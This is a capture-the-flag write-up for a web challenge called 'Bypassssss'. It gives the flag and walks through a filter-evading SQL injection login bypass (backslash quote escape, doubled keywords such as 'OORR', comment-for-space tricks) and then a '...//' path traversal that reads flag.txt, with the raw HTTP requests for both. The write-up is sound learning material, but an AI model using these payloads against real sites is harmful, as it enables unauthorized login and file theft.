# Bypassssss

## Description

> I used to have a website but unfortunately my website always gets hacked :(. But now I'm pretty sure they won't break into my website, right? right?!?!
>
> <http://ctf.tcp1p.com:45679>
>
> Attachment: dist.zip

## Flag

TCP1P{fR4gm3nTEd_SqL_1Nj3ction_and_lfi!?!1d9f3kd8cxm}

## Solution

Step1: Login Authentication Bypass

- Escape single quote (`'`) with a backslash (`\`)
- replace `OORR` to `OR` with `'/OR/i'` pattern. same for `true`
- Avoid Whitespace with comment out (`/**/`)
- Avoid last single quote (`'`) by using `#`

generated query:

- `SELECT * FROM admin WHERE username = '\' AND password = '/**/OR/**/true#'`

same to:

- `SELECT * FROM admin WHERE username = 'foobar' OR true`

```text
POST /check-login.php HTTP/1.1
Host: a
Cookie: PHPSESSID=ssv726vhc1lf1j09d47kn6ftuc
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=\&password=/**/OORR/**/trtrueue#


```

Step2: Path Traversal

```text
GET /viewer.php?image=...//...//...//...//...//flag.txt HTTP/1.1
Host: a
Cookie: PHPSESSID=ssv726vhc1lf1j09d47kn6ftuc
Content-Type: application/x-www-form-urlencoded
Content-Length: 0


```

## References

- <https://portswigger.net/support/sql-injection-bypassing-common-filters>
- <https://book.hacktricks.xyz/pentesting-web/login-bypass>
- <https://book.hacktricks.xyz/pentesting-web/login-bypass/sql-login-bypass>
  > 'oR/**/2#
